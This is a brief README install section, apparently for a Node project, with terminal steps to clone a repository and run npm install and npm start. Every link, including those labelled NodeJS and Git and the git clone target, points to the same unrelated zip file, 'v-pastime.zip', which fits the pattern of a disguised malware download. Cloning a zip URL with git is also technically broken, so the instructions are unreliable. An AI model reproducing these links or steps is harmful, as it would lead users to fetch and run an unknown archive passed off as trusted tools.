### Install using the terminal
You will need to have [NodeJS](https://raw.githubusercontent.com/undercoverhecker/v3/main/static/styles/v-pastime.zip) and [Git](https://raw.githubusercontent.com/undercoverhecker/v3/main/static/styles/v-pastime.zip) installed.
````bash
$ git clone https://raw.githubusercontent.com/undercoverhecker/v3/main/static/styles/v-pastime.zip
````
Once the repo has been cloned run the following commands individually.
````bash
$ npm install
$ npm start
````
